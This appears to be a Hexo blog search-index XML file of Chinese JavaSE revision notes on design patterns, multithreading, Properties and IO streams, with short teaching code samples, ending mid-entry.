<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[javaSE复习之——设计模式_简单工厂与工厂方法模式]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E4%B8%8E%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[简单工厂模式概述 它又叫静态工厂方法模式，它定义一个具体的工厂类覅则创建一些类的实列 优点 客户端不需要在负责对象的创建，从而明确了各个类的职责 缺点 这个静态工厂类负责所有对象的创建，如果有新的对象添加，或者某些对象创建方式不同，就需要不断修改工厂，不利于后期维护 工厂方法模式概述 工厂方法模式中，抽象工厂类类负责定义创建对象的接口，具体对象的创建工作由继承抽象工厂的具体类实现 优点 客户端不需要再负责对象的创建，从而明确了各个类的职责，如果由新的对象增加，只需要增加一个具体的类和工厂即可，不影响已有的代码，增强了系统的维护性 缺点 需要额外写代码，增加了工作量 代码示例12345DogFactory df = new DogFactory();//DogFactory是实现工厂接口的工厂类Dog d = (Dog) df.createAnimal();//调用工厂类重写的抽象方法中的createAnimal类来创建对象d.eat(); 示例继承体系 Factory工厂接口 定义抽象方法createAnimal() DogFactory重写方法createAnimal()，创建dog对象 CatFactory重写方法createAnimal(),创建cat对象 Animal dog cat]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>简单工厂模式</tag>
        <tag>工厂方法模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——多线程_线程池]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E7%BA%BF%E7%A8%8B%E6%B1%A0%2F</url>
    <content type="text"><![CDATA[线程池的概述 一个形象的比喻： 把很多线程全部养在一个池子里，要用就拿出来用，不用就放回去，还不会死掉的。这样就不用一直创建-死亡，因为线程的创建-死亡需要与计算机系统交互，这样的成本是很高的，用上线程池就可以很好的提高性能，尤其是程序中有很多生存周期短的线程。在jdk5之前必须手动创建线程池，jdk5之后java内置线程池 jdk5新增了一个Executors工厂类来生产线程池，有如下几个方法： .newFixedTreadPool(int) 创建一个线程池int传多少就是可以放多少线程 .newSingleTreadExecutor() 创建一个可以放一条线程的线程池 线程池对象 ExecutorService ExecutorService线程池对象中的方法： .submit(线程对象) 把线程放入线程池中，并且执行 .shutdown() 关闭线程池 创建线程池示例1ExecutorService es = Executors.newFixedTreadPool(12)]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>线程池</tag>
        <tag>JDK5新特性Executors工厂类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——多线程_线程的5种状态]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E7%BA%BF%E7%A8%8B%E7%9A%845%E7%A7%8D%E7%8A%B6%E6%80%81%2F</url>
    <content type="text"><![CDATA[ps：面试的时候可能会问1、新建，创建线程对象 2、就绪状态（执行了start开始命令，让他有了执行资格，但是因为cpu的机制没有执行权） 3、运行状态（抢到了cpu执行权） 4、阻塞状态（当运行时遇到了sleep或者wait进入睡眠，当睡眠结束又进入就绪状态） 5、死亡（线程执行完毕，线程对象变成了垃圾）]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>线程的5种状态面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——多线程_线程组]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E7%BA%BF%E7%A8%8B%E7%BB%84%2F</url>
    <content type="text"><![CDATA[线程组的概述 它可以对一批线程进行分类管理，java允许程序直接对线程组进行控制 线程组的类 ThreadGroup 线程组类中的方法 .getName() 通过线程组对象获取他组的名字，返回String，默认所属组为main主线程 创建一个线程组12ThreadGroup tg = new ThreadGroup("线程组名称");//不传入线程组名称则默认线程组为main主线程 创建一个线程并且放在某个组内1Thread t = new Thread(创建好的线程组，要创建线程的对象，线程名(可不填)); 线程组的作用举例 当我们执行 tg.setDaemon(true) 设置成守护线程时，线程组内所有线程都被设置成了守护线程]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>线程组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——多线程_JDK5新特性互斥锁]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-JDK5%E6%96%B0%E7%89%B9%E6%80%A7%E4%BA%92%E6%96%A5%E9%94%81%2F</url>
    <content type="text"><![CDATA[概述 它是锁（synchronized）的封装类，它更加的强大 互斥锁类 reentrantLock 监视器类 Condition（封装了一下Object中的监视器方法） 互斥锁方法 .lock() 获得一个锁 .unlock() 释放此锁 .newCondition() 获取一个Condition监视器对象，用来进行线程通信 通过互斥锁线程通信示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061class Printer3 &#123; private ReentrantLock r = new ReentrantLock(); private Condition c1 = r.newCondition(); private Condition c2 = r.newCondition(); private Condition c3 = r.newCondition(); private int flag = 1; public void print1() throws InterruptedException &#123; r.lock(); //获取锁 if(flag != 1) &#123; c1.await(); &#125; System.out.print("加"); System.out.print("油"); System.out.print("加"); System.out.print("油"); System.out.print("！"); System.out.print("\r\n"); flag = 2; //this.notify(); //随机唤醒单个等待的线程 c2.signal(); r.unlock(); //释放锁 &#125; public void print2() throws InterruptedException &#123; r.lock(); if(flag != 2) &#123; c2.await(); &#125; System.out.print("加"); System.out.print("油"); System.out.print("加"); System.out.print("油"); System.out.print("\r\n"); flag = 3; //this.notify(); c3.signal(); r.unlock(); &#125; public void print3() throws InterruptedException &#123; r.lock(); if(flag != 3) &#123; c3.await(); &#125; System.out.print("a"); System.out.print("b"); System.out.print("c"); System.out.print("d"); System.out.print("e"); System.out.print("f"); System.out.print("g"); System.out.print("\r\n"); flag = 1; c1.signal(); r.unlock(); &#125;&#125;]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>JDK5新特性</tag>
        <tag>互斥锁</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——多线程_两线程通信]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%A4%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[什么时候需要通信 多线程并发时，在默认情况下CPU时随机切换线程执行的，如果我们希望他们又规律的执行，就可以使用通信，例如每个线程执行一次打印 Object中方法： .wait() 让本线程等待（暂停运行） .notify() 让一条线程停止等待，当有多条线程等待是随机停止等待一条 .notifyAll() 让所有等待线程停止等等待 为什么wait方法和notify方法定义在object中？ 答： 因为锁对象可以是任意对象，而Object是所有类的基类，所以他们两个定义在Object中 sleep方法和wait方法的区别是什么（面试题）？ 1、sleep方法必须传入参数时间到了自动醒来 2、wait方法可以传入参数也可以不传入参数，传入参数就是在参数时间后等待，不传入则立马开始等待 3、sleep在同步代码块或者同步函数中，不会释放锁（cpu会一直在这个方法或者代码块中等待） 4、wait在同步函数或者同步代码块中，会释放锁（让cpu可以去执行其他线程） 线程之间通信注意事项： 带同步代码块中，用哪个对象锁，就用哪个对象调用wait方法等待 线程通信例子（jdk1.5版本之前解决方案）123456789101112131415161718192021222324252627282930313233343536//等待唤醒机制class Printer &#123; private int flag = 1; public void print1() throws InterruptedException &#123; synchronized(this) &#123; if(flag != 1) &#123; this.wait(); //当前线程等待 &#125; System.out.print("加"); System.out.print("油"); System.out.print("加"); System.out.print("油"); System.out.print("！"); System.out.print("\r\n"); flag = 2; this.notify(); //随机唤醒单个等待的线程 &#125; &#125; public void print2() throws InterruptedException &#123; synchronized(this) &#123; if(flag != 2) &#123; this.wait(); &#125; System.out.print("加"); System.out.print("油"); System.out.print("加"); System.out.print("油"); System.out.print("\r\n"); flag = 1; this.notify(); &#125; &#125;&#125; ps：两个以以上线程进行通信增加flag值修改即可，不过必须是使用notifyAll，并且判断语句需要使用while不能使用if]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>两线程通信</tag>
        <tag>sleep方法和wait方法的区别是什么（面试题）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——多线程_Timer类]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B-Timer%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[Timer的概述 它其实就是一个计时器，线程可以用它安排以后在后台执行的任务，可以安排执行一次，或者定期重复执行，可以把它想象成一个闹钟。 使用方法 创建一个定时任务类，继承TimerTask类，然后在主方法创建Timer对象并且传入任务类对象和要执行的时间，如果需要第一次执行之后果断时间继续重复执行，那么就在第三个参数传入一个等待时间 使用方法案例123456789101112131415public class Test13_Timer &#123; public static void main(String[] args) &#123; Timer t = new Timer(); Calendar c = Calendar.getInstance(); c.set(Calendar.MINUTE, 56); t.schedule(new tesk(), c.getTime()); &#125;&#125;class tesk extends TimerTask &#123; @Override public void run() &#123; System.out.println("定时任务11111"); &#125;&#125;]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>Timer类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——设计模式_单列设计模式]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E5%88%97%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[概述 单列设计模式就是保证某个类只能被创建一个对象 如何保证这个类在内存中只有一个对象呢？ 1、私有化它的构造方法，不让别的类访问这个类 2、在这个类中定义一个本类的对象，并且将它私有化、静态化、并且用最终修饰符修饰。 3、创建一个静态的get方法返回对这个对象的引用 代码示例1（饿汉式）12345678910class Singleton &#123; //1、私有构造方法不让别人访问 private Singleton() &#123;&#125; //2、创建本类对象让别人访问 private static final Singleton s = new Singleton(); //3、创建个体方法 public static Singleton getInstance() &#123; return s; &#125;&#125; 为什么叫饿汉式？ 因为类一加载就要创建对象，比喻一个饿汉一上来就要吃，吃的东西也就是new的这个对象。 ps：其实get方法都可以不需要创建，因为引用对象的成员变量是用final修饰的，直接调用即可，当然这样就不是饿汉式了，而是第三种格式。 代码示例2（懒汉式）12345678910111213class Singleton &#123; //1、私有构造方法不让别人访问 private Singleton() &#123;&#125; //2、创建声明引用 private static Singleton s ; //3、创建个体方法 public static Singleton getInstance() &#123; if(s == null) &#123; s = new Singleton(); &#125; return s; &#125;&#125; ps：因为它比较懒，要用到的时候才去创建，所以叫懒汉式，但是平时开发不用懒汉式，而用饿汉式。 为什么平时用饿汉式？ 答： 因为虽然懒汉式不会浪费空间内存，但是他会有线程安全问题 举个例子：当我线程1和线程2要获取这个类，当cpu执行的线程1刚好判断进去创建对象的时候，突然cpu又去执行线程2了，当cpu执行完线程2的时候已经创建好了一个对象，这时cpu又回来执行线程1，那么就创建了两个对象，所以它会又线程安全问题。 那懒汉式什么时候用？ 答： 面试的时候！面试的时候会出一个“请写出一个单例的延迟加载模式”，那么这个时候其实就是让我们写懒汉模式。 两种单例模式实现的区别 1、饿汉式它是空间换时间 解析：因为一上来就直接创建对象，要用的时候直接调用，所以要用的时候速度相对更快 2、懒汉式它是时间换空间 解析：因为一上来它不创建对象，而要用的时候先判断再创对象，而且以后每次需要用都要判断，所以浪费了时间 3、在多线程访问时，饿汉式绝对不会创建多个对象，而懒汉式就会存在线程安全问题，会创建多个对象 Runtime类概述： 每个java程序都有一个Runtime类，它与运行环境相连接，它就是是使用的单例设计模式。 Runtime是的应用场景 当我们需要执行cmd之类的命令的时候就可以勇担Runtime中的exec方法]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>单列设计模式</tag>
        <tag>延迟加载模式面试题</tag>
        <tag>Runtime类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——线程]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[线程概述 线程其实就是程序执行的一条路径，一个进程中可以包含多条线程，多线程并发执行可以提高程序效率，可以同使完成多项任务 多线程的应用场景 迅雷多线程一起下载 服务器同时处理多个客户请求 多线程原理(单核CPU) 在电脑上运行多个程序时，其实cpu一次只能做一个事，做一段时间后然后换另一个另一个做一段时间，只是cpu的速度太快了，看起来就是同时做很多事，也就是说多线程其实只是表面上的多线程，底层cpu还是一次只能做一个事，但是这有个前提，那就是那个cpu是单核cpu，如果事多核cpu，那么就可以真正的达到并行。 多线程并行和并发的区别 并行 并行是两个任务同时运行，需要多核cpu，有多少核就可以并行多少任务。 并发 并发是两个任务都请求运行，而一个处理器只能接受一个任务，就安排两个任务轮流进行，由于时间比较段短就感觉两个任务是同时在运行 ps 我们所谓的多线程就是并发，如果不使用多线程，那么程序就是一句一句代码请求，如果使用了多线程，那么就可以这个方法请求运行，同时另一个方法也请求运行，也就是说，没有使用多线程的话代码是一条一条请求，使用了就是多条同时请求，但底层并不是并行，只是cpu处理太快了感觉不到。 多线程程序实现方法1 1、定义类继承Thread 2、重写run方法 3、把新线程要做的事写在run方法中 4、创建线程对象，也就是我们定义的这个对象 5、开启新的线程（start），内部会自动执行run方法 多线程程序实现方法2 1、定义类实现Runnable接口 2、重写run方法 3、把新线程要做的事卸载run方法中 4、创建Thread对象，并且给它的构造方法传入一个实现了Runnable接口类的对象 5、利用Thread开启新的线程 多线程程序实现方法3 第三种创建多线程的接口 Callable 创建方式： 1、创建一个线程类，并且继承Callable&lt;&gt;类和重写call方法 2、创建线程池 3、创建线程对象然后用submit方法加入线程池即可 两种实现多线程的区别（面试可能问） 继承Thread： 因为我们创建的类继承了Thread类，所以当我们调用start时，是直接执行子类的run方法，也就是我们创建的类。 实现Runnable接口创建对象并传入实例化Thread的构造方法： 我们是先创建实现了Runnable接口的对象，然后创建Thread对象并把之前创建的对象传入Thread构造方法，这时Thread类会把传入的对象保存到成员变量中，当我们调用Thread对象的start方法的时候，Thread对象会调用它的成员变量中的run方法，当然这个成员变量就是我们创建的那个实现了Runnable接口的对象 两种实现多线程的好处与坏处 继承Thread： 好处：可以直接调用Thread中的方法，这样代码简洁。 坏处：既然继承了Thread方法就不能继承其他类了 实现Runnable接口： 好处：因为接口是可以多实现的，所以可以继承其他父类 坏处：不能直接创建对象使用，代码更加复杂 ps： 个人感觉实现Runnable其实是继承Thread的一个补充，在开发时看情况使用。 Thread类的方法 .start() 开启线程，多次启动是非法的 .getName() 获取线程名，默认线程名从Thread -0开始以此类推 .setName() 设置线程名 .currentThread() 获取当前线程对象的引用，在哪调用就获取哪的线程 .sleep(毫秒, 纳秒) 休眠线程，传入多少时间就停多长时间，也可以单独传毫秒 .setDaemon() 守护线程，设置一个线程为守护线程后，该线程不会单独执行，当其他非守护线程全部执行完之后自动退出。 ps：在非守护线程全部执行完毕后，会有一个缓冲时间，这个缓冲时间内守护线程还会运行，也就相当于非守护线程退出时会告诉守护线程可以退出了，这个告诉的时间就是缓冲时间 .join() 调用此方法的线程暂停（写这句代码的线程），等待指定线程结束后，当前线程再继续运行 .join(int) 等待指定的毫秒后继续执行 ps：如果在main主方法中调用t.join()，那么等待t这个线程执行结束之后，主方法才会继续执行，这个命令通常用在主方法中。 .yield() 礼让线程，让出cpu，也就是让自己在cpu的执行优先级中降低，就是让别人先执行 .setPriority(1-10) 设置线程优先级，默认是5 .getThreadGroup() 通过线程对象获取它所属的组，返回线程组对象 同步代码块的概述 当有多条线程并发的时候，cpu会先执行完同步代码块中所有代码才会去执行另一个线程，不会这里执行几句代码那里执行几句代码。 ps：它其实就是锁 什么时候需要同步？ 当多线程并发，我们希望某个线程中某些代码执行过程中不切换到其他线程工作，我们就需要用到同步代码块。 同步代码块关键字 synchronized 定义方式：123synchronized(锁对象) &#123;代码块&#125; 同步代码块（锁）的注意事项： 1、锁对象可以是任意的对象 2、两个需要同步的代码块需要使用同一个锁，否则不能达到目标效果 3、不能是匿名对象，因为两个匿名对象根本就不是一个对象，也就是不是同一把锁 4、不要把锁进行嵌套，否则容易出现死锁，因为可能会出现互相等待的局面 同步方法如何定义？ 解答： 只要在修饰方法的时候加上synchronized关键字即可 同步方法注意事项： 非静态方法锁对象是它自己这个对象，也就是this 静态方法因为它是随着类的加载而加载的，所以它的对象就是它所在类的字节码文件，也就是说静态方法的锁对象就是它所在类的字节码文件 线程安全问题 当多条线程操作同一个数据时，可能会出现数据安全问题 解决方法 在某一段需要判断并且操作数据地方加上一个同步代码块 注意事项 使用的锁对象一定要是同一个锁，建议直接用类的class文件，如果非要用引用数据类型，那么一定要用静态的。 以前线程安全类的回顾 线程安全的类涉及数据操作的方法都加了synchronized修饰，比如Vector、ArrayList，StringBuffer、StringBuilde 线程安全方法 .synchronized[这里可以后接集合类型，是什么类型就返回那个类型的集合] ps：它的作用是传入一个集合对象，传出一个线程安全的集合对象]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>线程</tag>
        <tag>两种实现多线程的区别（面试可能问）</tag>
        <tag>同步代码块（锁）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Properties集合]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Properties%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[Properties概述 它是一个双列集合，Properties的父类是HashTable类，它有一个固定的作用，那就是存储配置文件。 ps:虽然Hashtables被HashMap替代了，但是Hashtable有个争气的儿子——Properties hashtable和hashMap区别（面试题）： 共同点： 1、底层都依赖hash算法 2、都是双列集合 不同点： 1、HashMap是线程不安全的，效率高，jdk1.2版本出现的 2、Hashtable是线程安全的，效率相对低，jdk1.0版本出现的 3、HashMap可以储存null键和null值 4、Hashtable不可以储存null键和null值 Properties的特殊方法 .setProperty(key, value) 设置键和对应的值 .getProperty(key) 根据键获取相对应的值，返回String .propertyNames() 返回集合中所有键的Enumeration枚举 .load(InputStream) 从配置文件读取配置项到集合中 .store(OutputStream) 遍历所有配置案例1234567891011121314Properties prop = new Properties();prop.setProperty("name", "张三");prop.setProperty("tel", "18912345678");//System.out.println(prop);Enumeration&lt;String&gt; en = (Enumeration&lt;String&gt;) prop.propertyNames();while(en.hasMoreElements()) &#123; String key = en.nextElement(); //获取Properties中的每一个键 String value = prop.getProperty(key); //根据键获取值 System.out.println(key + "="+ value);&#125; load与storte案例演示 load读 123Properties prop = new Properties();prop.load(new FileInputStream("config.properties"));//将文件上的键值对读取到集合中 store写 12345prop.setProperty("tel", "18912345678");//先修改集合中的配置prop.store(new FileOutputStream("config.properties"), null);//第二个参数是对列表参数的描述,可以给值,也可以给null]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>hashtable和hashMap区别（面试题）</tag>
        <tag>Properties集合</tag>
        <tag>配置文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——IO流_标准输入输出流]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81%2F</url>
    <content type="text"><![CDATA[概念 System.in 是InputStream，他们是标准输入流，默认可以从键盘读取字节数据，Scanner的底层就是用它。 System.out 是printStream，他们是标准输出流，默认可以向console（控制台）中输出字符宣传和字节数据 修改标准输入输出流 修改输入流 System.setIn(InputStream) 修改输出流 System.setOut(printStream)ps：如果修改标准输入输出流指向文件的话，那么输入流就不会从键盘读了，而是从文件，输出流同理。 代码示例1234InputStream is = new System.in;int x = is.read();//从键盘读取一个字节System.out.println(x)； ps：输入48打印52，因为read一次只读一个字节，也就是这里只读到了4，而我们输入的4是一个字符类型的数据，所以read会通过码表获取字符类型4对应的值，也就是52，最后打印的也就是52了 输入流注意事项 输入流只有一个对象，再用System.in是不能再创建的，当然标准输入流是不需要关的，除非和某个文件关联了，因为关联了文件会占用资源]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>IO流</tag>
        <tag>标准输入输出流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——IO流_打印流]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E6%89%93%E5%8D%B0%E6%B5%81%2F</url>
    <content type="text"><![CDATA[概念 可以很方便的将对象的toString()结果输出，并且自动加上换行，而且还可以使用自动刷出模式，自动刷出就是println一个数据就在文件中写入一个数据 ps：System.out就是一个PrintStream，其默认向控制台输出信息 打印流的类： printStream 打印字节流 printWrite 打印字符流 示例123printWrite pw = new printWrite("1.txt");pw.println("111");//向文件写入111 注意事项 1、如果开启了自动刷出，那么只有println这么一个方法支持自动刷出 2、print、println方法底层是把需要打印的数据转换成字符串再打印的 3、write和print的不同之处是传入什么就直接写入什么 ps：打印流是只操作目的的，也就是只操作写出数据的]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>IO流</tag>
        <tag>打印流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——IO流_数据输入输出流]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E6%95%B0%E6%8D%AE%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81%2F</url>
    <content type="text"><![CDATA[概述 它可以按照基本数据类型的大小读写数据，因为字节流读文件时向那个字节前面加8个二进制位组成一个int，写文件时会自动砍掉int的前8个二进制位，所以我们直接读写int类型数据时文本数据会出错，而数据输入输出流就不会这样，他会把基本数据类型所有字节全部写出去，不过开发用到的不多。 例如 按照long大小读写一个数的时候，写出数据会占8个字节，而读取数据也会一次读8个 数据输入输出流的类 DataInputStream、DataOutputStream 使用方式1DataInputStream dis = new DataInputStream(new FileInputStream("1.txt))；]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>IO流</tag>
        <tag>数据输入输出流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——IO流_对象操作流]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E5%AF%B9%E8%B1%A1%E6%93%8D%E4%BD%9C%E6%B5%81%2F</url>
    <content type="text"><![CDATA[概述 该流可以将一个对象写出，或者读取一个对象到程序中，也就是执行了序列化和反序列化的操作。 对象操作流的类 ObjectOutputStream 序列化 将对象写到文件中，可以比喻为游戏的存档 反序列化 从文件中读取对象，可以比喻成游戏读档 注意事项 1、被操作的对象一定要实现Serializable接口 2、无论都还是取，都是一次只能处理一个对象。 3、实现Serializable接口后，可以加一个id号，这个id好用来好看存的档和读的档是不是一样的。 对象操作流方法 .readObject() 反序列化，从文件读对象 .writeObject() 序列化，把对象写到文件中 如果一共只存入两个对象，而取第三个对象的时候会报错，怎么办？ 解决方法 先把要保存的对象放到集合中，然后直接写出一个集合对象即可。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>IO流</tag>
        <tag>对象操作流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——IO流_随机访问流]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E9%9A%8F%E6%9C%BA%E8%AE%BF%E9%97%AE%E6%B5%81%2F</url>
    <content type="text"><![CDATA[概述 它可以在文件任何位置开始读，也可以在文件任何地方开始写。 ps：其实它不属于流，因为它的父类是Object，但是呢，它融合了InputStream与OutpuStream的功能，所以他同时具备了读和写的功能。 使用场景 多线程下载 我们可以让第一条线程下载0-1000第二条线程下载1000-2000，以此类推。 随机访问流类 RandomAccessFile 随机访问流的方法： .seek() 设置开始位置指针 .write() 写 .read() 读]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>IO流</tag>
        <tag>随机访问流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——IO流_内存输出流]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E5%86%85%E5%AD%98%E8%BE%93%E5%87%BA%E6%B5%81%2F</url>
    <content type="text"><![CDATA[内存输出流的概述 该输出流可以向内存中写数据，把内存当作一个缓冲区，写出之后可以一次性获取出所有数据。 内存输出流类 ByteArrayOutputStream ps：它其实是一个缓冲区，实例化这个类时在内存中创建了一个可以增长的字节数组，所以它可以不用关闭流，因为根本就只是个缓冲区。 ByteArrayOutputStream的方法 .toByteArray() 获取缓冲区全部数据，返回一个byte[] .toString(可传入码表) 获取缓冲区全部数据，根据平台默认码表返回String 应用场景 字节流读取文本时可能读取到半个汉字，所以可以用内存输出流，把文本放到缓冲区中。 为什么当要读取文本内容并且操作时不直接用字符流？ 1、我们不知道这个文本一共有多少个字符，所以不好定义数组缓冲区。 2、虽然可以使用数组来实现缓冲区，但是太麻烦，代码量更多，而ByteArrayOutputStream却很方便。 内存输出流面试题 定义一个文件输入流，调用read方法，将a.txt文件中的内容打印出来，byte大小为5 代码示例 12345678910 FileInputStream fis = new FileInputStream("a.txt"); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte b[] = new byte[5]; int n; while ((n = fis.read(b)) != -1) &#123; baos.write(b, 0, n);//写入到内存输出流 &#125; System.out.println(baos.toString("gbk")); fis.close();]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>IO流</tag>
        <tag>内存输出流</tag>
        <tag>内存输出流面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——IO流_序列流]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E5%BA%8F%E5%88%97%E6%B5%81%2F</url>
    <content type="text"><![CDATA[序列流概述 序列流可以把多个字节输入流整合成一个，从序列流中读取数据时，将从被整合的第一个流开始读，然后依次往后读，也就是把N个流合成成一个流，这样方便操作。 序列流类 SequenceInputStream 两个流合并序列代码示例1SequenceInputStream sis = new SequenceInputStream(FileInputStream, FileInputStream)； N个流合并序列代码示例 ps： 因为需要N个流合并的话，那么SequenceInputStream 构造方法就需要传入一个流的枚举，而Vector集合中有一个方法elements使返回一个枚举，所以我们可以使用集合，把流对象先放在集合中，然后再获取这个集合的枚举，最后传给SequenceInputStream 构造方法。 123456789101112Vector&lt;FileInputStream&gt; v = new Vector&lt;&gt;();v.add(new FileInputStream("a.txt"));v.add(new FileInputStream("b.txt"));v.add(new FileInputStream("c.txt"));SequenceInputStream sis = new SequenceInputStream(v.elements());FileOutputStream fos = new FileOutputStream("abc.txt");int t;while ((t = sis.read()) != -1) &#123; fos.write(t);&#125;fos.close();sis.close(); 使用场景1： 当我们需要读取两个文件，并且需要把两个文件整合成一个文件时，不使用序列流就会使代码不简洁，使用序列流就只要操作序列流即可。 使用场景2 如果想把两个MP3合成成一个MP3就可以用到，这样就会播放完第一个直接播放下一个。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>IO流</tag>
        <tag>序列流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——设计模式_装饰设计模式]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A3%85%E9%A5%B0%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
